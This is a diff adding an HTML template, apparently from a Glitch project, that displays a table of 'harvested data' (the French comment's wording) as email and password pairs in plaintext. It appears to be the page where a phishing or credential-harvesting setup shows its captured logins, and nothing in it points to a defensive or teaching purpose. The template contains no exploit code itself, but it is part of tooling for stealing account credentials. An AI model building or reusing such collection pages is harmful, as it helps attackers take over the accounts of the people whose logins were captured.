@@ -1,0 +1,26 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <title>User List</title>
+    <meta name="description" content="A cool thing made with Glitch">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/style.css">
+  </head>
+  <body>
+    <!-- Affichage des données recoltées -->
+    <table>
+      <tr>
+        <td>Email</td>
+        <td>Mot de passe</td>
+      </tr>
+      {% for i in range(0, list.length) %}
+        {%if (i%2==0)%}<tr>{%endif%}
+          <td>{{list[i]}}</td>
+        {%if (i%2==1)%}</tr>{%endif%}
+      {% endfor %}
+    </table>
+  </body>
+</html>
